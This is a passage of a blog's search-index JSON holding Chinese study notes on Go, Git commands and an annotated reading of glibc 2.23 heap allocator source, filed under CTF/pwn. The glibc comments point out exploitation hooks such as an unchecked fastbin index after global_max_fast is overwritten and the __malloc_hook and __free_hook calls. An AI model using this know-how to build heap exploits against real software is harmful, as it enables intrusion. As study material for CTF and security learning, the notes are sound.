interface_name() string { // 指针接收者 xxx } 空接口 没有定义任何方法的接口，空接口类型的变量可以存储任意类型的变量 var x interface{} x =\"hello\" x = 10 x = false // 皆可 类型断言 if str, ok := x.(string); ok { fmt.Println(\"x is a string\", str) } else { fmt.Println(\"x is not a string\") } ","date":"2025-01-25","objectID":"/go/:8:2","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"网络编程 client := \u0026http.Client{} var data = strings.NewReader(`{\"key1\":\"value1\"}`) req, err := http.NewRequest(\"POST\", \"url\", data) // 创建请求 req.Header.Set(\"Key\", \"value\") resp, err := client.Do(req) // 发起请求 defer resp.Body.Close() bodyText, err := io.ReadAll(resp.Body) // 读取请求响应 ","date":"2025-01-25","objectID":"/go/:8:3","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"并发 go启动新goroutine线程，环境在多个goroutine间多路复用， for { // 主函数循环可继续执行，不会阻塞 go func(xx) } 可取消上下文 ctx, cancel := context.WithCancel(context.Background()) // 创建可取消的子上下文ctx及取消函数cancel, cancel()可放于goroutine中, 可取消ctx, 基于ctx的上下文也取消 \u003c-ctx.Done() // 等待上下文取消，关闭通道 ","date":"2025-01-25","objectID":"/go/:8:4","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"算法方法 ","date":"2025-01-25","objectID":"/go/:9:0","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"子串 两层循环 for start := 0; start \u003c len(a); start++{ for end := start; end \u003e 0; end--{ //每一个子串的操作 } } ","date":"2025-01-25","objectID":"/go/:9:1","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"滑动窗口 单调队列+双端队列，队列维护数组的索引，保证索引对应数组的元素单调 ","date":"2025-01-25","objectID":"/go/:9:2","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"动态规划 找子问题，可以连接前面的问题的关系 ","date":"2025-01-25","objectID":"/go/:9:3","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"轮转 (i + 轮转数) % 数组长 先逆置，再对前k个逆置，对后m个逆置 ","date":"2025-01-25","objectID":"/go/:9:4","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"反转链表 //pre 结点Next初始化为nil，即空结点 for cur != nil{ next = cur.Next // 将 next 指向当前节点的下一个节点 cur.Next, pre, cur = pre, cur, next // 反转当前节点的指针方向，同时更新 pre } //最终pre为头 ","date":"2025-01-25","objectID":"/go/:9:5","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"开发 ","date":"2025-01-25","objectID":"/go/:10:0","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes","Language"],"content":"中间件 // 预处理 + 后处理, 路由上可注册多个Middleware func Middleware (args..){ // pre-handle Next() // after-handle } ","date":"2025-01-25","objectID":"/go/:10:1","tags":["language"],"title":"GO","uri":"/go/"},{"categories":["Notes"],"content":"命令 先 commit 一次后才会真正创建 master 分支 从 git 服务器拉取完整仓库代码 git clone xxx.git 配置开发者用户和邮箱，代码每次提交包含配置 git config user.name xxx git config user.email xx@xx.com cat .git/config # 查看配置 git config --list # 获取所有 git 配置 # 配置代理 git config --global http.proxy 127.0.0.1:7890 git config --global https.proxy 127.0.0.1:7890 # 查看代理 git config --global --get http.proxy git config --global --get https.proxy # 取消 git config --global --unset http.proxy git config --global --unset https.proxy 查看文件变动状态 git status 添加文件变动到暂存区 git add xxfile git add . # 添加所有文件 git add -i # 进入交互式 # patch: 显示文件当前内容与本地版本库差异，决定是否添加修改到暂存区 # update: 列出工作区 修改 或 删除 的文件列表 # diff: 比较暂存区文件和本地版本库的差异 此时.git/objects中加入xx/yyyyyyyyy，可通过git cat-file -p xxyyyyyyyyy查看添加的文件内容 列出将要被提交的文件 git commit -n 提交文件变动到版本库，若为其他分支会获取一个url用于pull request git commit -m \"description\" # 会创建新的tree、blob、commit object # 可以直接换行 # --amend 只添加 修改 和 删除 的文件到本地版本库，修改最近一次commit信息，修改后commit id变化 feat/fix/...: xxxx - xxxx - xxxx 查看commit添加的内容 git ls-files -s git show --raw # 最近提交的commit文件 撤消上一次commit的内容 git reset --soft HEAD^ git reset --soft HEAD~1 # 撤回到上一次还没提交 删除暂存区的内容 git rm --cached -r file 修改最近3个commit git rebase -i HEAD~3 查看悬空的commit git fsck --lost-found 删除不需要的object，且打包压缩object减少仓库体积 # 先设置reflog防止无操作后数据丢失 git reflog expire --expire=now --all git gc prune=now # 修剪多久前对象，默认2周前 重命名文件并添加变动到暂存区 git mv src.md dest.md -f # -f 强制 从工作区和暂存区移除文件并添加变动到暂存区 git rm xx.md 将本地的代码改动推送到服务器 git push origin branch_name # orgin: git 服务器地址 git push -u origin branch_name # 无该分支 -u 来创建 删除远程分支 git push origin -d remote_branch 将本地分支推送到对应远程分支 git push origin dev_tmp:dev_tmp 服务器最新代码拉取到本地并与本地代码合并，等价于git fetch + git merge git pull origin brach_name # main or master git pull --rebase # 等价于 git fetch + git rebase 合并他人代码 git fetch # 显示哪些分支发生更改 git merge orgin/xxx_branch # 云端他人分支合并到自己分支 git stash # 处理冲突 将当前工作目录更改丢到一边，使得工作目录保持干净 git merge orgin/xxx_branch git stash pop # 将刚丢到一边的更改捡回来 远程分支存在本地分支没有的代码，本地分支存在远程分支没有的代码 git pull --no-rebase origin branch_name // 处理冲突 git add xxx git rm xxx git commit xxx git push origin branch_name:branch_name 当git reset HEAD~3使得远程分支高于本地分支多个版本，而需要远程分支强制回滚到本地某个分支(不建议使用) git push --force-with-lease origin branch_name 版本提交记录 git log # J下翻, K上翻, Q退出 标记里程碑 git tag publish/0.0.1 git tag -a # 创建附注标签 git push origin publish/0.0.1 分支命令 git branch # 查看分支 git branch xxx # 创建 git branch -m old_name new_name # 重命名 git branch -a # 查看本地版本库和远程版本库上的分支列表 git branch -r # 远程版本库的分支列表 git branch -d xxx # 删除 git branch -vv # 查看带有最后提交id、最近提交原因等信息的本地版本库分支列表 git branch --set-upstream-to=origin/my_test # 将本地分支关联到远程分支 切换分支 # 切换到某分支 -b 创建并切换 git checkout xxx # 创建一个全新的，完全没有历史记录的新分支，必须commit操作后才真正成为一个分支 git checkout --orphan new_branch # 比较两个分支间的差异内容，并提供交互式的界面来选择进一步的操作 git checkout -p other_branch 合并其它分支到当前分支 # 默认合并，分支中的各个节点都加入到master中 git merge # 将待合并分支上的 commit 合并成一个新的 commit 放入当前分支，适用于待合并分支的提交记录不需要保留的情况 git merge --squash # 执行正常合并，在 Master分支上生成一个新节点 git merge --no-ff # 没有冲突的情况下合并，git自动生成提交原因 git merge --no-edit # fast-forward：线性不创建新merge结点，命令`--ff-only` # three-way merge：三方合并产生新merge结点，命令`--no-ff` 栈：保存当前修改或删除的工作进度 git stash # 将未提交文件保存到Git栈中 git stash list # 查看栈中保存的列表 git stash show stash@{0} # 显示一条记录 git stash drop stash@{0} # 移除一条记录 git stash pop # 检出最新一条记录移除 git stash apply stash@{0} # 检出一条记录 git stash brach new # 检出最近一次记录并创建一个新分支 git stash clear # 清空栈里所有记录 git stash create # 为当前修改或删除文件创建自定义栈，返回一个ID git stash store ID # 栈真正创建一个记录，文件并未从工作区移除 gitlab 配置 # gitlab ssh key ssh-keygen -t rsa -C \"email.com\" # 查看 id_rsa.pub 复制到 gitlab ssh-key 中 # 即可 git clone 比较工作区、暂存区、本地版本库间文件差异 git diff --stat 远程仓库 git remote -v # 列出已存在的远程分支 git remote add origin https://github.com/xx/xx.github.com.git # 添加一个新远程仓库 将远程版本库的最新更新取回到本地版本库，不会执行merge操作，会修改refs/remote内分支信息 git fetch origin xx/0.0.1 ssh免密配置访问 ssh-keygen -t ed25519 -C \"email@example.com\" # 秘钥公钥在~/.ssh/id_ed25519及id_ed25519.pub中 .gitignore中存储需要被忽略而不推送到服务器的文件 某分支下专门写注释学习 git worktree add ../project-a a ","date":"2025-01-14","objectID":"/git/:1:0","tags":["git"],"title":"GIT","uri":"/git/"},{"categories":["Notes"],"content":"object commit：存储提交信息，一个 commit 对应唯一版本的代码，可找到 tree ID tree：存储文件目录信息，可获取不同 blob ID blob：存储文件内容 tag ","date":"2025-01-14","objectID":"/git/:2:0","tags":["git"],"title":"GIT","uri":"/git/"},{"categories":["Notes"],"content":"Refs Refs中存储对应的commit ID refs/heads 前缀表示分支，refs/tags 前缀表示标签 ","date":"2025-01-14","objectID":"/git/:3:0","tags":["git"],"title":"GIT","uri":"/git/"},{"categories":["Notes"],"content":"研发 github 一个主干分支，基于Pull Request往主干分支提交代码 owner外用户Fork创建自己仓库进行开发 ","date":"2025-01-14","objectID":"/git/:4:0","tags":["git"],"title":"GIT","uri":"/git/"},{"categories":["Notes"],"content":"Vscode 记录与 git 对应命令 Changes 里文件 “+” 放到 Staged Changes : git add . √ + message : git commit -m \"message\" ","date":"2025-01-14","objectID":"/git/:5:0","tags":["git"],"title":"GIT","uri":"/git/"},{"categories":["Notes","CTF"],"content":"Heap ","date":"2024-11-19","objectID":"/source_analyze/:1:0","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"结构 malloc_par malloc.c中，记录堆管理器的相关参数 struct malloc_par { unsigned long trim_threshold; // 收缩阈值 默认128KB /* 用于控制main_arena中保留的内存量 当释放的chunk为mmap获得的，同时大小大于mmap_threshold，更新mmap_threshold同时将trim_threshold乘2; 当释放的chunk大小在 fast bin 范围内，合并完 size 大于 FASTBIN_CONSOLIDATION_THRESHOLD:0x10000，根据该字段缩小 top chunk */ INTERNAL_SIZE_T top_pad; // 初始化或扩展堆时申请内存是否添加额外pad，默认为0 // 调用sbrk函数时在原有请求大小上添加的一个值，是一个填充 INTERNAL_SIZE_T mmap_threshold; // mmap分配阈值 /* 决定sysmalloc用mmap还是sbrk分配内存界限, \u003e则mmap, \u003c则sbrk, 若释放的内存通过mmap得到的, 则mmap_threshold与该内存大小取max, 且该值最大不超过DEFAULT_MMAP_THRESHOLD_MAX:0x2000000 */ INTERNAL_SIZE_T arena_test; // 最小分配区 INTERNAL_SIZE_T arena_max; // 最大分配区 int n_mmaps; // mmap分配的内存数量, mmap一次+1, munmap一次-1 int n_mmaps_max; // 最多能mmap的内存数量 int max_n_mmaps; // n_mmaps达到过的最大值 int no_dyn_threshold; // 是否开启mmap分配阈值动态调整，默认为0开启 INTERNAL_SIZE_T mmapped_mem; // 当前 mmap 分配的内存大小总和 /*INTERNAL_SIZE_T sbrked_mem;*/ /*INTERNAL_SIZE_T max_sbrked_mem;*/ INTERNAL_SIZE_T max_mmapped_mem; // mmap 的内存大小总和达到过的最大值 INTERNAL_SIZE_T max_total_mem; // 单线程情况下统计进程分配的内存总数 char *sbrk_base; // brk系统调用申请的heap区域的起始地址 }; 该结构体类型实例mp_来记录ptmalloc参数 #define DEFAULT_TOP_PAD 131072 // 0x20000 #define DEFAULT_MMAP_MAX (65536) // 0x10000 #define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024) #define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN // 0x20000 #define DEFAULT_TRIM_THRESHOLD (128 * 1024) // 0x20000 static struct malloc_par mp_ = { .top_pad = DEFAULT_TOP_PAD, .n_mmaps_max = DEFAULT_MMAP_MAX, .mmap_threshold = DEFAULT_MMAP_THRESHOLD, .trim_threshold = DEFAULT_TRIM_THRESHOLD, #define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8)) .arena_test = NARENAS_FROM_NCORES (1) }; heap_info 位于堆块的开头，记录通过mmap从Memory Mapping Segment处申请到的内存块信息，arena.c中 为非主线程分配内存使用，因为主分配区可以直接使用sbrk扩展，只有一个堆，非主线程的堆是提前分配好的，当该资源用完时需要重新申请内存空间，不连续所以需要记录不同的堆的链接结构 typedef struct _heap_info { mstate ar_ptr; /* 指向管理该堆块的arena分配区 */ struct _heap_info *prev; /* 上一个heap_info，单链表形式记录一个线程所有堆结构 */ size_t size; /* 该堆块大小 */ size_t mprotect_size; /* 记录该堆块被mprotected保护的大小*/ char pad[-6 * SIZE_SZ \u0026 MALLOC_ALIGN_MASK]; // 在SIZE_SZ不正常时填充来对其, 正常pad占用0字节 } heap_info; ","date":"2024-11-19","objectID":"/source_analyze/:1:1","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"malloc 2.23 宏 SIZE_SZ // sizeof( size_t ) 1字节大小 MALLOC_ALIGN_MASK // ( 2 * SIZE_SZ ) - 1 = 2 * 8 - 1 = 0x10 - 1 MINSIZE // ( MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK ) \u0026 ~MALLOC_ALIGN_MASK 向下取整 MIN_CHUNK_SIZE // offsetof( struct malloc_chunk, fd_nextsize ) 0x20字节 __libc_malloc void *__libc_malloc (size_t bytes) { mstate ar_ptr; // 保存指向分配区main_arena的指针 void *victim; // 保存获得的堆块内存指针: chunk_addr + 0x10 // 获取 __malloc_hook void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) // 检查__malloc_hook值是否被设置 return (*hook)(bytes, RETURN_ADDRESS (0)); // 若被设置则调用其指向的函数, 参数为申请的内存大小 arena_get (ar_ptr, bytes); // 若未被设置则获取本线程一个可用分配区thread_arena victim = _int_malloc (ar_ptr, bytes); // 申请内存并返回 if (!victim \u0026\u0026 ar_ptr != NULL) // 堆块未申请成功且arena的指针不为空 { LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); // 获取下一个分配区 victim = _int_malloc (ar_ptr, bytes); // 再次申请分配 } if (ar_ptr != NULL) (void) mutex_unlock (\u0026ar_ptr-\u003emutex); // 操作完成, 解锁分配区使其他线程能够访问 // 只有3种情况 assert (!victim || // 未申请到内存 chunk_is_mmapped (mem2chunk (victim)) || // mmap获取的内存 ar_ptr == arena_for_chunk (mem2chunk (victim))); // 内存从当前线程对应的thread_arena管理的内存中获取 return victim; } _int_malloc CAS：从内存位置读取值与期望值比较，相等则更新，不相等则失败重新尝试 ABA：一个值在经过多次修改后又回到原始值 static void *_int_malloc (mstate av, size_t bytes) { INTERNAL_SIZE_T nb; /* 请求的chunk_size */ unsigned int idx; /* 对应bin数组中的index索引 */ mbinptr bin; /* 指向对应bin的指针 */ mchunkptr victim; /* 指向分配的chunk */ INTERNAL_SIZE_T size; /* 分配的chunk的size */ int victim_index; /* 分配的chunk的bin的index */ mchunkptr remainder; /* 指向分割后剩下的那块chunk */ unsigned long remainder_size; /* 分割后剩下那块chunk的size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* 链表操作 */ mchunkptr bck; /* 链表操作 */ const char *errstr = NULL; checked_request2size (bytes, nb); // 检查并将申请内存转换为适合内存分配的块大小 if (__glibc_unlikely (av == NULL)) // 没有可用arena即arena未初始化 { void *p = sysmalloc (nb, av); // 通过sysmalloc系统调用从mmap获取堆块 if (p != NULL) alloc_perturb (p, bytes); // 用memset清理空间数据 return p; } // 在fastbin大小内 if ((unsigned long)(nb) \u003c= (unsigned long)(get_max_fast())) // global_max_fast:0x80 { idx = fastbin_index(nb); // 获取fastbin中的索引，无任何检查，改global_max_fast可使idx极大 mfastbinptr *fb = \u0026fastbin(av, idx); // #define fastbin(ar_ptr, idx) ((ar_ptr)-\u003efastbinsY[idx]) 即fb指向fastbin中对应的bin的地址 mchunkptr pp = *fb; // pp指向该对应fastbin中第一个chunk do { victim = pp; // 取出第一个空闲chunk来分配 【victim】 if (victim == NULL) // fastbin中无chunk，跳出，去申请相应大小的smallbin break; // 等价于*fb = victim-\u003efd, 链表头指向该空闲chunk的下一个chunk } while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-\u003efd, victim)) != victim); // # define catomic_compare_and_exchange_val_acq(mem, newval, oldval) // CAS(Compareand-Swap)原子操作, 避免多线程的ABA问题 // 存在可使用的chunk if (victim != 0) { if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) // 检测该chunk的size是否符合该bin的index { errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; } check_remalloced_chunk(av, victim, nb); // 对chunk标志位检查、是否是malloc_state所表示的分配区中的 // 检查是否已分配，是否重复分配和大小检查 void *p = chunk2mem(victim); // p 指向 chunk 的 fd 字段地址即data区域 alloc_perturb(p, bytes); return p; } } // 在 small bin 大小范围内 if (in_smallbin_range(nb)) { idx = smallbin_index(nb); // 获取smallbin的下标索引 bin = bin_at(av, idx); // 取出对应的bin if ((victim = last(bin)) != bin) // #define last(b) ((b)-\u003ebk) 即 bin-\u003ebk != bin说明small bin非空 // 【victim为取出的表尾第一个chunk】 { if (victim == 0) /* main_arena未初始化时victim为0，表示smallbin还未初始化为双向循环链表 */ malloc_consolidate(av); // 初始化 else { bck = victim-\u003ebk; // 取出victim之后的一个chunk检查 if (__glibc_unlikely(bck-\u003efd != victim)) // 安全检查: 该chunk的fd应指回victim { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } set_inuse_bit_at_offset(victim, nb); // 设置物理相邻的下一个chunk inuse位, 表示victim被使用 // 使链表头 bin 与 bck 的bk与fd相互连接, 将 victim 脱离双向循环链表 bin-\u003ebk = bck; bck-\u003efd = bin; if (av !=","date":"2024-11-19","objectID":"/source_analyze/:1:2","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"sysmalloc 2.23 sysmalloc static void *sysmalloc(INTERNAL_SIZE_T nb, mstate av) // 需要申请的大小need_bytes + mainarena { mchunkptr old_top; /* av-\u003etop的原始值 */ INTERNAL_SIZE_T old_size; /* av-\u003etop大小 */ char *old_end; /* av-\u003etop结束地址 */ long size; /* 给MORECORE或mmap调用的参数 */ char *brk; /* MORECORE返回值 */ long correction; /* 给第二个MORECORE调用的参数 */ char *snd_brk; /* MORECORE第二个返回值 */ INTERNAL_SIZE_T front_misalign; /* 新空间前的不可用字节 */ INTERNAL_SIZE_T end_misalign; /* partial page left at end of new space */ char *aligned_brk; /* aligned offset into brk */ mchunkptr p; /* the allocated/returned chunk */ mchunkptr remainder; /* remainder from allocation */ unsigned long remainder_size; /* its size */ size_t pagesize = GLRO(dl_pagesize); bool tried_mmap = false; // 标记是否尝试过mmap if (av == NULL || // 无arena，则也没有top chunk ((unsigned long)(nb) \u003e= (unsigned long)(mp_.mmap_threshold) \u0026\u0026 // 大于mmap阈值则使用mmap (mp_.n_mmaps \u003c mp_.n_mmaps_max))) // 且mmap的次数小于最大的nmap的次数 { char *mm; /* mmap调用的返回值 */ // 走mmap调用 try_mmap: /* mmap直接分配内存，不需要添加到管理free bin的链表中，所以不存在chunk前后关系 当chunk被使用时无法借用后一个chunk的prev_size字段，需要将prev_size的SIZE_SZ加上进行内存向上取整对齐 nb 向上对齐为 size */ if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) size = ALIGN_UP(nb + SIZE_SZ, pagesize); else size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize); tried_mmap = true; if ((unsigned long)(size) \u003e (unsigned long)(nb)) { // 若size\u003enb 调用MMAP mm = (char *)(MMAP(0, size, PROT_READ | PROT_WRITE, 0)); if (mm != MAP_FAILED) // MMAP成功 { if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) { // 若对齐，进行检查，不可用字节设为0 assert(((INTERNAL_SIZE_T)chunk2mem(mm) \u0026 MALLOC_ALIGN_MASK) == 0); front_misalign = 0; } else // 未对齐获取不可用字节大小 front_misalign = (INTERNAL_SIZE_T)chunk2mem(mm) \u0026 MALLOC_ALIGN_MASK; if (front_misalign \u003e 0) { correction = MALLOC_ALIGNMENT - front_misalign; // 进行纠正 p = (mchunkptr)(mm + correction); p-\u003eprev_size = correction; set_head(p, (size - correction) | IS_MMAPPED); } else { p = (mchunkptr)mm; set_head(p, size | IS_MMAPPED); // 设置size中标志 } int new = atomic_exchange_and_add(\u0026mp_.n_mmaps, 1) + 1; // mmap的数量加1 atomic_max(\u0026mp_.max_n_mmaps, new); // 取最大更新max_n_mmaps unsigned long sum; sum = atomic_exchange_and_add(\u0026mp_.mmapped_mem, size) + size; // mmap的内存大小加上size atomic_max(\u0026mp_.max_mmapped_mem, sum); // 取最大值更新max_mmapped_mem check_chunk(av, p); return chunk2mem(p); // 返回内存 } } } if (av == NULL) return 0; // mmap失败且无arena，系统调用失败 // 有arena则有top chunk，需要扩展top chunk，切割内存返回 old_top = av-\u003etop; // 获取原top chunk old_size = chunksize(old_top); // 获取原top chunk 大小 old_end = (char *)(chunk_at_offset(old_top, old_size)); // 获取原top chunk结束地址 brk = snd_brk = (char *)(MORECORE_FAILURE); // 初始化brk和snd_brk为0，#define MORECORE_FAILURE 0 assert((old_top == initial_top(av) \u0026\u0026 old_size == 0) || // 1. arena第一次结构体初始化时，top chunk未被分配，此时top chunk指向自己, size为0 ((unsigned long)(old_size) \u003e= MINSIZE \u0026\u0026 prev_inuse(old_top) \u0026\u0026 ((unsigned long)old_end \u0026 (pagesize - 1)) == 0)); // 2. 非第一次，top chunk已有，检查size大于等于0x20，prev_inuse置位，且与页面对齐 assert((unsigned long)(old_size) \u003c (unsigned long)(nb + MINSIZE)); // top chunk 不够用：原top chunk 大小 \u003c 申请大小+0x20 // 非主线程 if (av != \u0026main_arena) { heap_info *old_heap, *heap; size_t old_heap_size; old_heap = heap_for_ptr(old_top); // 获取原始heap堆段的起始地址，heap_info在堆块开头 old_heap_size = old_heap-\u003esize; // 获取原始堆大小 // 尝试扩展堆块 if ((long)(MINSIZE + nb - old_size) \u003e 0 \u0026\u0026 grow_heap(old_heap, MINSIZE + nb - old_size) == 0) {// 堆块扩展成功 // 更新 av-\u003esystem_mem += old_heap-\u003esize - old_heap_size; arena_mem += old_heap-\u003esize - old_heap_size; // 新堆顶块大小: old_heap + old_heap-\u003esize - old_top set_head(old_top, (((char *)old_heap + old_heap-\u003esize) - (char *)old_top) | PREV_INUSE); } // 或创建新堆 else if ((heap = new_heap(nb + (MINSIZE + sizeof(*heap)), mp_.top_pad))) { // 创建新堆后更新数据 heap-\u003ear_ptr = av; // 更新 arena 管理分配区 heap-\u003eprev = old_heap; av-\u003esystem_mem += heap-\u003esize; arena_mem += heap-\u003esize; // 更新新的top chunk位置，之前的top chunk作废 top(av) = chunk_at_offset(heap, sizeof(*heap)); // top chunk大小: heap大小减去开头heap结构体大小 set_head(top(av), (heap-\u003esize - sizeof(*heap)) | PREV_INUSE); /* 释放旧的top chunk","date":"2024-11-19","objectID":"/source_analyze/:1:3","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"free 2.23 __libc_free void __libc_free(void *mem) { mstate ar_ptr; mchunkptr p; void (*hook)(void *, const void *) = atomic_forced_read(__free_hook); // 原子读free_hook if (__builtin_expect(hook != NULL, 0)) // 查看free_hook是否被设置 { (*hook)(mem, RETURN_ADDRESS(0)); // 非空则调用该hook return; if (mem == 0) /* 需要释放的内存为0，free(0)无效 */ return; p = mem2chunk(mem); // 用户内存指针转换为chunk指针 if (chunk_is_mmapped(p)) /* 若是mmap申请的内存 */ { /* no_dyn_threshold初始默认为0, free的堆大小大于mmap阈值且小于默认最大的mmap阈值 说明mmap需求量大，但耗时大，于是调节阈值mmap_threshold来使得倾向于用brk而非mmap #define DEFAULT_MMAP_THRESHOLD_MAX (4 * 1024 * 1024 * sizeof(long)) trim_threshold 为是否 systrim 减少 ptmalloc 保留内存的参考值 */ if (!mp_.no_dyn_threshold \u0026\u0026 p-\u003esize \u003e mp_.mmap_threshold \u0026\u0026 p-\u003esize \u003c= DEFAULT_MMAP_THRESHOLD_MAX) { mp_.mmap_threshold = chunksize(p); mp_.trim_threshold = 2 * mp_.mmap_threshold; // 收缩阈值也提高 LIBC_PROBE(memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); } munmap_chunk(p); // 调用了__munmap释放映射 return; } // 内存由ptmalloc申请的而非mmap申请 ar_ptr = arena_for_chunk(p); // 获取arena _int_free(ar_ptr, p, 0); // 调用_int_free进行堆块释放 } _int_free static void _int_free(mstate av, mchunkptr p, int have_lock) { INTERNAL_SIZE_T size; /* 释放的chunk的大小 */ mfastbinptr *fb; /* 对应的fastbin */ mchunkptr nextchunk; /* 内存空间中下一个连续的chunk */ INTERNAL_SIZE_T nextsize; /* 下一个chunk大小 */ int nextinuse; /* 下一个chunk是否在使用 */ INTERNAL_SIZE_T prevsize; /* 内存空间中上一个连续的chunk */ mchunkptr bck; /* 存储bin链表指针 */ mchunkptr fwd; /* 存储bin链表指针 */ const char *errstr = NULL; int locked = 0; size = chunksize(p); // 获取chunk大小 // 检查1：-size强制转换为无符号整型会发生模运算转换为接近地址空间的最大值，通过判断p和-size防止指针越界溢出 if (__builtin_expect((uintptr_t)p \u003e (uintptr_t)-size, 0) || __builtin_expect(misaligned_chunk(p), 0)) { // 检查2：是否与MALLOC_ALIGN_MASK对齐 errstr = \"free(): invalid pointer\"; errout: if (!have_lock \u0026\u0026 locked) (void)mutex_unlock(\u0026av-\u003emutex); malloc_printerr(check_action, errstr, chunk2mem(p), av); return; } // 若大小比 MINSIZE小或size不对齐，则不能free if (__glibc_unlikely(size \u003c MINSIZE || !aligned_OK(size))) { errstr = \"free(): invalid size\"; goto errout; } check_inuse_chunk(av, p); // 在 fastbin 范围内 if ((unsigned long)(size) \u003c= (unsigned long)(get_max_fast()) #if TRIM_FASTBINS \u0026\u0026 (chunk_at_offset(p, size) != av-\u003etop) // 且下一个chunk不是top chunk #endif ) { // 若下一个chunk大小小于2*0x8=0x10或大于系统可用的内存，进入报错部分 if (__builtin_expect(chunk_at_offset(p, size)-\u003esize \u003c= 2 * SIZE_SZ, 0) || __builtin_expect(chunksize(chunk_at_offset(p, size)) \u003e= av-\u003esystem_mem, 0)) { if (have_lock || // 有互斥锁则直接进入报错 ({assert(locked == 0);mutex_lock(\u0026av-\u003emutex);locked = 1; // 无锁则显式上锁之后再检查判断 chunk_at_offset(p, size)-\u003esize \u003c= 2 * SIZE_SZ || chunksize(chunk_at_offset(p, size)) \u003e= av-\u003esystem_mem; }) ) { errstr = \"free(): invalid next size (fast)\"; goto errout; } if (!have_lock) { // 读取分配区所分配的内存总量需要对分配区加锁,检查完以后,释放分配区的锁 (void)mutex_unlock(\u0026av-\u003emutex); // 解锁 locked = 0; } } free_perturb(chunk2mem(p), size - 2 * SIZE_SZ); set_fastchunks(av); // 设置arena fastchunk标志位表明有使用fastbin unsigned int idx = fastbin_index(size); // 获取fastbin索引 fb = \u0026fastbin(av, idx); // fb指向fastbin的地址 mchunkptr old = *fb, old2; // old为fastbin中第一个chunk unsigned int old_idx = ~0u; do { if (__builtin_expect(old == p, 0)) { // 释放的chunk p和fastbin中第一个chunk是同一个chunk，报错double free errstr = \"double free or corruption (fasttop)\"; goto errout; } if (have_lock \u0026\u0026 old != NULL) old_idx = fastbin_index(chunksize(old)); p-\u003efd = old2 = old; // p的fd指向old，即将p插到第一个chunk位置 // *fb = p，即将fastbin的fd指向p } while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2); if (have_lock \u0026\u0026 old != NULL \u0026\u0026 __builtin_expect(old_idx != idx, 0)) { // 判断：old的索引是否也是该fastbin对应索引 errstr = \"invalid fastbin entry (free)\"; goto errout; } } // 再次判断，若不是mmap的，则是ptmalloc，前向后向合并放入unsorted bin else if (!chunk_is_mmapped(p)) { if (!have_lock) { (void)mutex_lock(\u0026av-\u003emutex); locked = 1; } nextchunk = chunk_at_offset(p, size); // 找到其下一个chunk if (__glibc_unlikely(p == av-\u003etop)) // 检查是不是释放top chunk { errstr = \"double free or corruption (top)\"; goto errout; } if (__builtin_expect(contig","date":"2024-11-19","objectID":"/source_analyze/:1:4","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"calloc 2.23 __libc_calloc 分配一块内存并初始化为零，calloc申请内存不会从tcache中获取，而是直接从堆块中获取 void *__libc_calloc(size_t n, size_t elem_size) // n项，每一项大小为elem_size { mstate av; mchunkptr oldtop, p; INTERNAL_SIZE_T bytes, sz, csz, oldtopsize; void *mem; unsigned long clearsize; unsigned long nclears; INTERNAL_SIZE_T *d; bytes = n * elem_size; // 相乘将需要申请的内存大小转换为以字节为单位 // 判断溢出 #define HALF_INTERNAL_SIZE_T (((INTERNAL_SIZE_T)1) \u003c\u003c (8 * sizeof(INTERNAL_SIZE_T) / 2)) if (__builtin_expect((n | elem_size) \u003e= HALF_INTERNAL_SIZE_T, 0)) { if (elem_size != 0 \u0026\u0026 bytes / elem_size != n) { __set_errno(ENOMEM); // 发生整数溢出，退出 return 0; } } void *(*hook)(size_t, const void *) = atomic_forced_read(__malloc_hook); if (__builtin_expect(hook != NULL, 0)) // 若malloc_hook被定义 { sz = bytes; mem = (*hook)(sz, RETURN_ADDRESS(0)); // 调用malloc_hook if (mem == 0) // 失败则退出 return 0; return memset(mem, 0, sz); // 并将内存清零 } sz = bytes; // 大小赋值 arena_get(av, sz); // 获取arena if (av) { #if MORECORE_CLEARS /* 由于无论是main_arena控制的堆通过sbrk扩展还是非main_arena通过heap_info向后扩展受保护的内存区域 新扩展的内存区初始值为0，不需要清空，因此后续需要清理的内存大小只清理与 top chunk 重合区域，提升效率 */ oldtop = top(av); // 获取top chunk oldtopsize = chunksize(top(av)); // 获取 top chunk 头之后可控制的内存大小 #if MORECORE_CLEARS \u003c 2 // 主线程 + top 